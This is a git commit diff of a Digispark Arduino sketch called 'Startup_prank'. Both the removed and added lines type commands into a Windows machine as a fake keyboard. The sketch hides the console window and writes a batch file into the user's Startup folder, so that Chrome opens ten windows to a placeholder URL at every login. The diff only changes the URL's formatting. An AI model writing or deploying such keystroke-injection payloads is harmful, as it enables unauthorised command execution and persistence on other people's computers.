37551490e38ebc0482faa5fa49ea8a984a9fac6c
Platy <daryl.limkz@gmail.com>
2017-03-29 17:37:37 +0800

    Update Startup_prank.ino

--- Startup_prank/Startup_prank.ino
+++ Startup_prank/Startup_prank.ino
@@ -6,7 +6,7 @@ void setup() {
     DigiKeyboard.println("cmd");
     DigiKeyboard.delay(500);
     DigiKeyboard.println("mode con: cols=16 lines=1&color FE");
-    DigiKeyboard.println("cd AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&echo for /l %%i in (1,1,10) do (start chrome /new-window https://www.example.com)>a.bat&exit"); //Change url
+    DigiKeyboard.println("cd AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&echo for /l %%i in (1,1,10) do (start chrome /new-window <https://www.example.com>)>a.bat&exit"); //Change url
 }
 void loop() {
 }
